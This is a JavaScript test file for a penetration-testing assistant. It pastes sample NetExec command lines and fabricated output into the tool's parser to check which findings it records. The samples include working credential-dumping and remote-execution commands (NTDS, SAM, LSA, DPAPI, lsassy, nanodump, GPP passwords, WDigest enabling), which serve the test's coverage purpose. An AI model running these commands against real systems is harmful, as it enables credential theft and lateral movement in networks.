/* nxc switch -> parser coverage (BIDIRECTIONAL). For every capability in the nxc catalog
 * (OBOL._nxcCatalog), paste REAL nxc output and assert:
 *   - success output mints the capability's declared produces (actionable entries), OR mints no payoff
 *     fact (informational entries);
 *   - denied/empty output mints nothing.
 * This closes the hole the corpus can't cover: the corpus injects facts directly, so it never proved that
 * pasting a given nxc command's output actually produces them. Every catalog entry MUST have a sample here
 * (the test fails on an uncovered entry), so coverage can't silently drift as the catalog grows.
 */
'use strict';
var path = require('path');
function req(p) { require(path.join(__dirname, '..', '..', p)); }
['facts', 'phases', 'pack', 'profile', 'command', 'workspace'].forEach(function (m) { req('assets/engine/' + m + '.js'); });
['common', 'nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource', 'findings', 'shape', 'pivot', 'nxc-catalog'].forEach(function (m) { req('assets/engine/parsers/' + m + '.js'); });
req('assets/engine/parsers/index.js');
var OBOL = globalThis.OBOL, P = OBOL.parsers, CAT = OBOL._nxcCatalog || [];

var fail = 0;
function ok(c, m) { if (!c) { console.error('  FAIL:', m); fail++; } else { console.log('  ok  :', m); } }
function facts(cmd, out) {
  var r = P.parseActionOutput({ command: cmd, actionId: '', stdout: out, scope: '10.10.10.10', domain: 'corp.local' });
  return (r.facts || []).map(function (f) { return f.kind; });
}
var PAYOFF = /^(foothold\.|access\.|loot\.|credential\.(available|plaintext|candidate)|hash\.)/;
var D = 'SMB 10.10.10.10 445 DC '; // nxc banner prefix (no [+] auth line, so informational output mints no payoff)

// sample[id] = { cmd, ok: <success output>, neg: <denied output> }
var sample = {
  'smb-auth':          { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021", ok: D + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)', neg: D + '[-] corp.local\\jdoe:Winter2021 STATUS_LOGON_FAILURE' },
  'smb-shares':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --shares", ok: D + 'Share  Permissions\n' + D + 'SYSVOL READ\n' + D + 'Users  READ', neg: D + '[-] authentication failed' },
  'smb-rid-brute':     { cmd: "nxc smb 10.10.10.10 -u guest -p '' --rid-brute", ok: D + '500: CORP\\Administrator (SidTypeUser)\n' + D + '1103: CORP\\svc-sql (SidTypeUser)', neg: D + '[-] STATUS_ACCESS_DENIED' },
  'smb-ntds':          { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --ntds", ok: D + 'administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n' + D + 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abcdef0123456789abcdef0123456789:::', neg: D + '[-] access denied' },
  'smb-sam':           { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --sam", ok: D + 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', neg: D + '[-] access denied' },
  'smb-exec':          { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -x whoami", ok: D + 'nt authority\\system', neg: D + '[-] access denied' },
  'smb-users':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --users", ok: D + '-Username-        -Last PW Set-\n' + D + 'administrator    2021-01-02\n' + D + 'svc-sql          2020-05-05', neg: D + '[-] STATUS_ACCESS_DENIED' },
  'smb-lsa':           { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --lsa", ok: D + "CORP\\svc_sql$:Sql_Server_2019!\n" + D + "CORP.LOCAL/svc-web:$DCC2$10240#svc-web#abcdef0123456789abcdef0123456789", neg: D + '[-] access denied' },
  'smb-dpapi':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --dpapi", ok: D + '[CREDENTIAL] domain\\jdoe - password: Winter2021!', neg: D + '[-] access denied' },
  'smb-loggedon':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --loggedon-users", ok: D + 'Logged on users\n' + D + 'CORP\\administrator\n' + D + 'CORP\\jdoe', neg: D + '[-] access denied' },
  'smb-gpp-password':  { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M gpp_password", ok: "GPP_PASSWORD 10.10.10.10 445 DC [+] Found credentials in SYSVOL\nGPP_PASSWORD 10.10.10.10 445 DC [+] Usernames: ['svc_deploy']\nGPP_PASSWORD 10.10.10.10 445 DC [+] Passwords: ['SuperSecret2021!']", neg: 'GPP_PASSWORD 10.10.10.10 445 DC [-] No gpp files found' },
  'smb-gpp-autologin': { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M gpp_autologin", ok: "GPP_AUTOLOGIN 10.10.10.10 445 DC [+] Found registry.xml\nGPP_AUTOLOGIN 10.10.10.10 445 DC [+] Usernames: ['autologin']\nGPP_AUTOLOGIN 10.10.10.10 445 DC [+] Passwords: ['Autumn2021']", neg: 'GPP_AUTOLOGIN 10.10.10.10 445 DC [-] nothing found' },
  'smb-lsassy':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M lsassy", ok: 'LSASSY 10.10.10.10 445 DC [+] corp.local\\jdoe 31d6cfe0d16ae931b73c59d7e0c089c0\nLSASSY 10.10.10.10 445 DC [+] corp.local\\svc_adm aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef', neg: 'LSASSY 10.10.10.10 445 DC [-] lsassy failed, access denied' },
  'smb-nanodump':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M nanodump", ok: 'NANODUMP 10.10.10.10 445 DC [+] corp.local\\admin aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef', neg: 'NANODUMP 10.10.10.10 445 DC [-] failed' },
  'smb-spider-plus':   { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M spider_plus", ok: 'SPIDER_PLUS 10.10.10.10 445 DC [+] Saved output to /tmp/nxc_spider/10.10.10.10.json\nSPIDER_PLUS found: SYSVOL/scripts/backup.config', neg: 'SPIDER_PLUS 10.10.10.10 445 DC [-] no readable shares' },
  'smb-wdigest':       { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M wdigest -o ACTION=enable", ok: 'WDIGEST 10.10.10.10 445 DC [+] UseLogonCredential set to 1', neg: 'WDIGEST 10.10.10.10 445 DC [-] access denied' },
  'smb-groups':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --groups", ok: D + 'Domain Admins membercount: 2\n' + D + 'Enterprise Admins membercount: 1', neg: D + '[-] access denied' },
  'smb-local-groups':  { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --local-groups", ok: D + 'Administrators membercount: 3', neg: D + '[-] access denied' },
  'smb-sessions':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --sessions", ok: D + 'Enumerated sessions\n' + D + '\\\\10.10.10.50 user: jdoe', neg: D + '[-] access denied' },
  'smb-disks':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --disks", ok: D + 'C$', neg: D + '[-] access denied' },
  'smb-computers':     { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --computers", ok: D + 'DC01$\n' + D + 'WEB01$', neg: D + '[-] access denied' },
  'smb-pass-pol':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --pass-pol", ok: D + 'Minimum password length: 7', neg: D + '[-] access denied' }
};

CAT.forEach(function (e) {
  var s = sample[e.id];
  if (!s) { ok(false, 'catalog entry ' + e.id + ' has NO sample in the switch→parser test (add one)'); return; }
  var got = facts(s.cmd, s.ok);
  if (e.informational) {
    ok(!got.some(function (k) { return PAYOFF.test(k); }), e.id + ' (informational): success output mints no payoff fact (got ' + (got.join(',') || 'none') + ')');
  } else {
    var missing = (e.produces || []).filter(function (p) { return got.indexOf(p) < 0; });
    // produces may list alternatives (e.g. hash.ntlm OR credential.plaintext from a dump); require AT LEAST ONE.
    ok(got.some(function (k) { return (e.produces || []).indexOf(k) >= 0; }),
      e.id + ' success → mints ' + (e.produces || []).join('|') + ' (got ' + (got.join(',') || 'none') + ')');
  }
  if (s.neg) {
    var ngot = facts(s.cmd, s.neg);
    ok(!ngot.some(function (k) { return PAYOFF.test(k); }), e.id + ' denied/empty → no payoff fact (got ' + (ngot.join(',') || 'none') + ')');
  }
});

console.log('\nNXC SWITCH→PARSER: ' + CAT.length + ' capabilities · ' + (fail ? fail + ' FAILURE(S)' : 'all passed'));
process.exit(fail ? 1 : 0);
